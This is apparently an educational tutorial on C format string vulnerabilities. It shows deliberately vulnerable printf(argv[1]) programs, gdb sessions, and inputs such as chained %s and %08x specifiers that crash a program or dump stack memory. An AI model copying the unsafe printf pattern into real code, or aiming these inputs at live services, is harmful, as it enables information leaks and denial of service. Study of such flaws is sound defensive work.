# Format String Vulnerabilities
#### What is a format string?
* Format string is an ASCIIZ string used to specify and control the representation of different variables.
```c
int a;
printf("%d", a);
   ^     ^
   |     |
   |   Format string
Format function
```

#### What is a format function?
* Format function uses the format string to convert C data types into string representation.
* Format string controls the format function.
  * The number of variables
  * Their representation in the result
  
#### Examples of format functions (a.k.a Variadic functions)
* Variadic functions accept variable number of arguments
  * Arguments are placed on the stack
  * Input format string decides the number of arguments to be read off the stack
    * "%s" - 1 argument
    * "%s%d" - 2 arguments
* printf
* Fprintf
* Sprintf
* Vfprintf
* Snprintf
* Vsprintf
* Vsnprintf

#### Why does this happen?
* User input is substituted in the format function.

#### What can be achieved with this?
* Crash the program.
* View the stack
* View memory at arbitrary locations
* Overwrite memory at arbitrary locations
* Code execution

#### Stack layout
```text
 ____________________	High Memory
|                    |		
|	   4 bytes		 |  
|____________________|		
|					 |
|	    Arg n		 |  ----------> Nth Argument
|____________________|
|					 |
|		   ---		 |	printf("%s %d ... %x", arg1, arg2 ... argn)
|____________________|
|					 |
|		Arg 2		 |  ----------> Second Argument
|____________________|
|					 |
|		Arg 1		 |  ----------> First Argument
|____________________|
|					 |
|	 Format String	 |  ----------> Format string %s
|____________________|
|					 |
|		 RET		 |
|____________________|
				        Low Memory
```

#### 1.) Correct implementation of Format strings. <i>(One argument, One format specifier, No Variables)</i>
```c
#include<stdio.h>

main(int argc, char**argv){
        printf("%s", argv[1]);
}
```
```sh
$ gcc -ggdb -mpreferred-stack-boundary=2 correct_implementation.c -o correct_implementation
$ ./correct_implementation Hi
Hi
$ ./correct_implementation %s
%s
```
Converts the arguments to a string and prints it to the console.

#### 2.) Incorrect implementation of Format strings. <i>(One argument, No format specifier, One Variable)</i>
```c
#include<stdio.h>

main(int argc, char**argv){
        char *secret = "Try printing this -> 1 \n";
        printf(argv[1]);
}

```
```sh
$ gcc -ggdb -mpreferred-stack-boundary=2 incorrect_implementation.c -o incorrect_implementation
$ ./incorrect_implementation Hi
Hi
$ ./incorrect_implementation %s
Try printing this -> 1
```
#### ** Debugging <i>incorrect_implementation.c</i> in GDB
```text
gdb ./incorrect_implementation -q
Reading symbols from ./incorrect_implementation...done.
(gdb) list
1       #include<stdio.h>
2
3       main(int argc, char**argv){
4               char *secret = "Try printing this -> 1 \n";
5               printf(argv[1]);
6       }
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   %ebp
   0x0804840c <+1>:     mov    %esp,%ebp
   0x0804840e <+3>:     sub    $0x4,%esp
   0x08048411 <+6>:     movl   $0x80484b0,-0x4(%ebp)
   0x08048418 <+13>:    mov    0xc(%ebp),%eax
   0x0804841b <+16>:    add    $0x4,%eax
   0x0804841e <+19>:    mov    (%eax),%eax
   0x08048420 <+21>:    push   %eax
   0x08048421 <+22>:    call   0x80482e0 <printf@plt>
   0x08048426 <+27>:    add    $0x4,%esp
   0x08048429 <+30>:    mov    $0x0,%eax
   0x0804842e <+35>:    leave
   0x0804842f <+36>:    ret
End of assembler dump.
(gdb) b *0x08048421
Breakpoint 1 at 0x8048421: file incorrect_implementation.c, line 5.
(gdb) run Hi
Starting program: /home/cs/Desktop/1/incorrect_implementation Hi

Breakpoint 1, 0x08048421 in main (argc=2, argv=0xbffff6e4) at incorrect_implementation.c:5
5               printf(argv[1]);
(gdb) x/8xw $esp
			    	 	(argv[1] - user input)
0xbffff640:     0xbffff844      0x080484b0      0x00000000      0xb7e23637
    (Pointer to format string)              (Pointer to secret)
0xbffff650:     0x00000002      0xbffff6e4      0xbffff6f0      0x00000000
	   (Base/Frame pointer) (return address -> __libc_start_main)
(gdb) x/4xw $ebp
0xbffff648:     0x00000000      0xb7e23637      0x00000002      0xbffff6e4
(gdb) disas 0xb7e23637
Dump of assembler code for function __libc_start_main:
   0xb7e23540 <+0>:     call   0xb7f2abc9 <__x86.get_pc_thunk.ax>
   0xb7e23545 <+5>:     add    $0x199abb,%eax
   0xb7e2354a <+10>:    push   %ebp
   0xb7e2354b <+11>:    push   %edi
   0xb7e2354c <+12>:    push   %esi
   0xb7e2354d <+13>:    push   %ebx
   0xb7e2354e <+14>:    mov    %eax,%edi
   0xb7e23550 <+16>:    sub    $0x4c,%esp
   0xb7e23553 <+19>:    mov    -0x6c(%edi),%edx
   0xb7e23559 <+25>:    mov    %eax,0x8(%esp)
   0xb7e2355d <+29>:    mov    0x74(%esp),%eax
   0xb7e23561 <+33>:    test   %edx,%edx
   0xb7e23563 <+35>:    je     0xb7e23643 <__libc_start_main+259>
   0xb7e23569 <+41>:    mov    (%edx),%ebx
   0xb7e2356b <+43>:    xor    %ecx,%ecx
   0xb7e2356d <+45>:    test   %ebx,%ebx
   0xb7e2356f <+47>:    sete   %cl
   0xb7e23572 <+50>:    mov    0x8(%esp),%esi
   0xb7e23576 <+54>:    test   %eax,%eax
   0xb7e23578 <+56>:    lea    0x40(%esi),%edx
   0xb7e2357e <+62>:    mov    %ecx,(%edx)
   0xb7e23580 <+64>:    je     0xb7e23592 <__libc_start_main+82>
   0xb7e23582 <+66>:    sub    $0x4,%esp
   0xb7e23585 <+69>:    push   $0x0
   0xb7e23587 <+71>:    push   $0x0
   0xb7e23589 <+73>:    push   %eax
   0xb7e2358a <+74>:    call   0xb7e39bd0 <__GI___cxa_atexit>
   0xb7e2358f <+79>:    add    $0x10,%esp
   0xb7e23592 <+82>:    mov    0x8(%esp),%eax
   0xb7e23596 <+86>:    mov    -0xdc(%eax),%eax
   0xb7e2359c <+92>:    mov    (%eax),%ebx
   0xb7e2359e <+94>:    and    $0x2,%ebx
   0xb7e235a1 <+97>:    jne    0xb7e2367e <__libc_start_main+318>
   0xb7e235a7 <+103>:   cmpl   $0x0,0x6c(%esp)
   0xb7e235ac <+108>:   je     0xb7e235ca <__libc_start_main+138>
   0xb7e235ae <+110>:   push   %edx
   0xb7e235af <+111>:   mov    0xc(%esp),%eax
   0xb7e235b3 <+115>:   mov    -0xb8(%eax),%eax
   0xb7e235b9 <+121>:   pushl  (%eax)
   0xb7e235bb <+123>:   pushl  0x70(%esp)
   0xb7e235bf <+127>:   pushl  0x70(%esp)
   0xb7e235c3 <+131>:   call   *0x7c(%esp)
---Type <return> to continue, or q <return> to quit---quit
Quit
(gdb) x/8xw $esp
0xbffff640:     0xbffff844      0x080484b0      0x00000000      0xb7e23637
0xbffff650:     0x00000002      0xbffff6e4      0xbffff6f0      0x00000000
(gdb) x/4xw $ebp
0xbffff648:     0x00000000      0xb7e23637      0x00000002      0xbffff6e4
(gdb) x/1s 0xbffff844
0xbffff844:     "Hi"
(gdb) x/1s 0x080484b0
0x80484b0:      "Try printing this -> 1 \n"
(gdb)
```

#### 3.) Incorrect implementation of Format strings. <i>(One argument, No format specifier, Two Variables)</i>
```c
#include<stdio.h>

main(int argc, char**argv){
        char *secret1 = "Try printing this -> 1 \n";
        char *secret2 = "Try printing this -> 2 \n";
        printf(argv[1]);
}
```
```sh
$ gcc -ggdb -mpreferred-stack-boundary=2 incorrect_implementation2.c -o incorrect_implementation2
$ ./incorrect_implementation2 Hi
Hi
$ ./incorrect_implementation2 %s
Try printing this -> 1
$ ./incorrect_implementation2 %s%s
Try printing this -> 1
Try printing this -> 2
```
#### ** Debugging <i>incorrect_implementation2.c</i> in GDB
```text
$ gdb ./incorrect_implementation2 -q
Reading symbols from ./incorrect_implementation2...done.
(gdb) list
1       #include<stdio.h>
2
3       main(int argc, char**argv){
4               char *secret1 = "Try printing this -> 1 \n";
5               char *secret2 = "Try printing this -> 2 \n";
6               printf(argv[1]);
7       }
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   %ebp
   0x0804840c <+1>:     mov    %esp,%ebp
   0x0804840e <+3>:     sub    $0x8,%esp
   0x08048411 <+6>:     movl   $0x80484c0,-0x8(%ebp)
   0x08048418 <+13>:    movl   $0x80484d9,-0x4(%ebp)
   0x0804841f <+20>:    mov    0xc(%ebp),%eax
   0x08048422 <+23>:    add    $0x4,%eax
   0x08048425 <+26>:    mov    (%eax),%eax
   0x08048427 <+28>:    push   %eax
   0x08048428 <+29>:    call   0x80482e0 <printf@plt>
   0x0804842d <+34>:    add    $0x4,%esp
   0x08048430 <+37>:    mov    $0x0,%eax
   0x08048435 <+42>:    leave
   0x08048436 <+43>:    ret
End of assembler dump.
(gdb) b *0x08048428
Breakpoint 1 at 0x8048428: file incorrect_implementation2.c, line 6.
(gdb) run Hi
Starting program: /home/cs/Desktop/1/incorrect_implementation2 Hi

Breakpoint 1, 0x08048428 in main (argc=2, argv=0xbffff6e4) at incorrect_implementation2.c:6
6               printf(argv[1]);
(gdb) x/8xw $esp
0xbffff63c:     0xbffff843      0x080484c0      0x080484d9      0x00000000
0xbffff64c:     0xb7e23637      0x00000002      0xbffff6e4      0xbffff6f0
(gdb) x/1s 0xbffff843
0xbffff843:     "Hi"
(gdb) x/1s 0x080484c0
0x80484c0:      "Try printing this -> 1 \n"
(gdb) x/1s 0x080484d9
0x80484d9:      "Try printing this -> 2 \n"
(gdb)
```

#### 4.) Incorrect implementation of Format strings. <i>(One argument, Two format specifiers, Two Variables)</i>
```c
#include<stdio.h>

main(int argc, char**argv){
        char *secret1 = "Try printing this -> 1 \n";
        char *secret2 = "Try printing this -> 2 \n";
        printf("Printing the first argument: %s %s \n", argv[1]);
}
```
```sh
$ gcc -ggdb -mpreferred-stack-boundary=2 incorrect_implementation3.c -o incorrect_implementation3
$ ./incorrect_implementation3 Hi
Printing the first argument: Hi Try printing this -> 1
```
#### ** Debugging <i>incorrect_implementation3.c</i> in GDB
```text
$ gdb ./incorrect_implementation3 -q
Reading symbols from ./incorrect_implementation3...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   %ebp
   0x0804840c <+1>:     mov    %esp,%ebp
   0x0804840e <+3>:     sub    $0x8,%esp
   0x08048411 <+6>:     movl   $0x80484c0,-0x8(%ebp)
   0x08048418 <+13>:    movl   $0x80484d9,-0x4(%ebp)
   0x0804841f <+20>:    mov    0xc(%ebp),%eax
   0x08048422 <+23>:    add    $0x4,%eax
   0x08048425 <+26>:    mov    (%eax),%eax
   0x08048427 <+28>:    push   %eax
   0x08048428 <+29>:    push   $0x80484f4
   0x0804842d <+34>:    call   0x80482e0 <printf@plt>
   0x08048432 <+39>:    add    $0x8,%esp
   0x08048435 <+42>:    mov    $0x0,%eax
   0x0804843a <+47>:    leave
   0x0804843b <+48>:    ret
End of assembler dump.
(gdb) b *0x0804842d
Breakpoint 1 at 0x804842d: file incorrect_implementation3.c, line 6.
(gdb) run Hi
Starting program: /home/cs/Desktop/2/incorrect_implementation3 Hi

Breakpoint 1, 0x0804842d in main (argc=2, argv=0xbffff6e4) at incorrect_implementation3.c:6
6               printf("Printing the first argument: %s %s \n", argv[1]);
(gdb) x/8xw $esp
0xbffff638:     0x080484f4      0xbffff843      0x080484c0      0x080484d9
0xbffff648:     0x00000000      0xb7e23637      0x00000002      0xbffff6e4
(gdb) x/1s 0x080484f4
0x80484f4:      "Printing the first argument: %s %s \n"
(gdb) x/1s 0xbffff843
0xbffff843:     "Hi"
(gdb) x/1s 0x080484c0
0x80484c0:      "Try printing this -> 1 \n"
(gdb) x/1s 0x080484d9
0x80484d9:      "Try printing this -> 2 \n"
(gdb) c
Continuing.
Printing the first argument: Hi Try printing this -> 1

[Inferior 1 (process 5655) exited normally]
(gdb) quit
```
#### 5.) Incorrect implementation of Format strings. <i>(One argument, Three format specifiers, Two Variables)</i>
```c
#include<stdio.h>

main(int argc, char**argv){
        char *secret1 = "Try printing this -> 1 \n";
        char *secret2 = "Try printing this -> 2 \n";
        printf("Printing the first argument: %s %s %s \n", argv[1]);
}

```
```sh
$ gcc -ggdb -mpreferred-stack-boundary=2 incorrect_implementation4.c -o incorrect_implementation4
$  ./incorrect_implementation4 Hi
Printing the first argument: Hi Try printing this -> 1
 Try printing this -> 2
```
#### ** Debugging <i>incorrect_implementation4.c</i> in GDB
```text
$ gdb ./incorrect_implementation4 -q
Reading symbols from ./incorrect_implementation4...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   %ebp
   0x0804840c <+1>:     mov    %esp,%ebp
   0x0804840e <+3>:     sub    $0x8,%esp
   0x08048411 <+6>:     movl   $0x80484c0,-0x8(%ebp)
   0x08048418 <+13>:    movl   $0x80484d9,-0x4(%ebp)
   0x0804841f <+20>:    mov    0xc(%ebp),%eax
   0x08048422 <+23>:    add    $0x4,%eax
   0x08048425 <+26>:    mov    (%eax),%eax
   0x08048427 <+28>:    push   %eax
   0x08048428 <+29>:    push   $0x80484f4
   0x0804842d <+34>:    call   0x80482e0 <printf@plt>
   0x08048432 <+39>:    add    $0x8,%esp
   0x08048435 <+42>:    mov    $0x0,%eax
   0x0804843a <+47>:    leave
   0x0804843b <+48>:    ret
End of assembler dump.
(gdb) b *0x0804842d
Breakpoint 1 at 0x804842d: file incorrect_implementation4.c, line 6.
(gdb) run Hi
Starting program: /home/cs/Desktop/2/incorrect_implementation4 Hi

Breakpoint 1, 0x0804842d in main (argc=2, argv=0xbffff6e4) at incorrect_implementation4.c:6
6               printf("Printing the first argument: %s %s %s \n", argv[1]);
(gdb) x/8xw $esp
0xbffff638:     0x080484f4      0xbffff843      0x080484c0      0x080484d9
0xbffff648:     0x00000000      0xb7e23637      0x00000002      0xbffff6e4
(gdb) x/1s 0x080484f4
0x80484f4:      "Printing the first argument: %s %s %s \n"
(gdb) x/1s 0xbffff843
0xbffff843:     "Hi"
(gdb) x/1s 0x080484c0
0x80484c0:      "Try printing this -> 1 \n"
(gdb) x/1s 0x080484d9
0x80484d9:      "Try printing this -> 2 \n"
(gdb) c
Continuing.
Printing the first argument: Hi Try printing this -> 1
 Try printing this -> 2

[Inferior 1 (process 5764) exited normally]
(gdb)
```
#### Crashing the program
* Motive
  * Denial Of service
  * Shutdown the remote service
  * Obtain core dump
```sh
$ ./incorrect_implementation2 %s
Try printing this -> 1
$ ./incorrect_implementation2 %s%s
Try printing this -> 1
Try printing this -> 2
$ ./incorrect_implementation2 %s%s%s
Try printing this -> 1
Try printing this -> 2
(null)
$ ./incorrect_implementation2 %s%s%s%s
Try printing this -> 1
Try printing this -> 2
(null)▒▒▒▒
P▒mc
$ ./incorrect_implementation2 %s%s%s%s%s
Try printing this -> 1
Try printing this -> 2
Segmentation fault (core dumped)
$ 
```
#### ** Debugging the crash in GDB
```text
$ gdb ./incorrect_implementation2 -q
Reading symbols from ./incorrect_implementation2...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   %ebp
   0x0804840c <+1>:     mov    %esp,%ebp
   0x0804840e <+3>:     sub    $0x8,%esp
   0x08048411 <+6>:     movl   $0x80484c0,-0x8(%ebp)
   0x08048418 <+13>:    movl   $0x80484d9,-0x4(%ebp)
   0x0804841f <+20>:    mov    0xc(%ebp),%eax
   0x08048422 <+23>:    add    $0x4,%eax
   0x08048425 <+26>:    mov    (%eax),%eax
   0x08048427 <+28>:    push   %eax
   0x08048428 <+29>:    call   0x80482e0 <printf@plt>
   0x0804842d <+34>:    add    $0x4,%esp
   0x08048430 <+37>:    mov    $0x0,%eax
   0x08048435 <+42>:    leave
   0x08048436 <+43>:    ret
End of assembler dump.
(gdb) b *0x08048428
Breakpoint 1 at 0x8048428: file incorrect_implementation2.c, line 6.
(gdb) run %s%s%s%s%s
Starting program: /home/cs/Desktop/3/incorrect_implementation2 %s%s%s%s%s

Breakpoint 1, 0x08048428 in main (argc=2, argv=0xbffff6d4) at incorrect_implementation2.c:6
6               printf(argv[1]);
(gdb) x/8xw $esp
0xbffff62c:     0xbffff83b      0x080484c0      0x080484d9      0x00000000
0xbffff63c:     0xb7e23637      0x00000002      0xbffff6d4      0xbffff6e0
(gdb) x/2xw $ebp
0xbffff638:     0x00000000      0xb7e23637
(gdb) x/1s 0xbffff83b
0xbffff83b:     "%s%s%s%s%s"
(gdb) x/1s 0x080484c0
0x80484c0:      "Try printing this -> 1 \n"
(gdb) x/1s 0x080484d9
0x80484d9:      "Try printing this -> 2 \n"
(gdb) c
Continuing.
Try printing this -> 1
Try printing this -> 2

Program received signal SIGSEGV, Segmentation fault.
0xb7e4f353 in _IO_vfprintf_internal (s=0xb7fbdd60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xbffff644 "\324\366\377\277\340\366\377\277") at vfprintf.c:1632
1632    vfprintf.c: No such file or directory.
(gdb) quit
```
#### View the stack
* Motive
  * Info leak
  * Access confidential data stored on the stack
```sh
$ ./incorrect_implementation2 %x
80484c0
$ ./incorrect_implementation2 "0x%08x"
0x080484c0
$ 
```
#### ** Debugging in GDB
```text
$ gdb ./incorrect_implementation2 -q
Reading symbols from ./incorrect_implementation2...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   %ebp
   0x0804840c <+1>:     mov    %esp,%ebp
   0x0804840e <+3>:     sub    $0x8,%esp
   0x08048411 <+6>:     movl   $0x80484c0,-0x8(%ebp)
   0x08048418 <+13>:    movl   $0x80484d9,-0x4(%ebp)
   0x0804841f <+20>:    mov    0xc(%ebp),%eax
   0x08048422 <+23>:    add    $0x4,%eax
   0x08048425 <+26>:    mov    (%eax),%eax
   0x08048427 <+28>:    push   %eax
   0x08048428 <+29>:    call   0x80482e0 <printf@plt>
   0x0804842d <+34>:    add    $0x4,%esp
   0x08048430 <+37>:    mov    $0x0,%eax
   0x08048435 <+42>:    leave
   0x08048436 <+43>:    ret
End of assembler dump.
(gdb) b *0x08048428
Breakpoint 1 at 0x8048428: file incorrect_implementation2.c, line 6.
(gdb) run %x
Starting program: /home/cs/Desktop/3/incorrect_implementation2 %x

Breakpoint 1, 0x08048428 in main (argc=2, argv=0xbffff6e4) at incorrect_implementation2.c:6
6               printf(argv[1]);
(gdb) x/8xw $esp
0xbffff63c:     0xbffff843      0x080484c0      0x080484d9      0x00000000
0xbffff64c:     0xb7e23637      0x00000002      0xbffff6e4      0xbffff6f0
(gdb) x/1s 0xbffff843
0xbffff843:     "%x"
(gdb) x/18xw $esp
0xbffff63c:     0xbffff843      0x080484c0      0x080484d9      0x00000000
0xbffff64c:     0xb7e23637      0x00000002      0xbffff6e4      0xbffff6f0
0xbffff65c:     0x00000000      0x00000000      0x00000000      0xb7fbd000
0xbffff66c:     0xb7fffc04      0xb7fff000      0x00000000      0xb7fbd000
0xbffff67c:     0xb7fbd000      0x00000000
(gdb) quit
```
```sh
$ ./incorrect_implementation2 "0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x"
0x080484c0 0x080484d9 0x00000000 0xb7614637 0x00000002 0xbf856294 0xbf8562a0 0x00000000 0x00000000 0x00000000 0xb77ae000 0xb77f0c04 0xb77f0000 0x00000000 0xb77ae000 0xb77ae000 0x00000000 0x4ee2f073
```
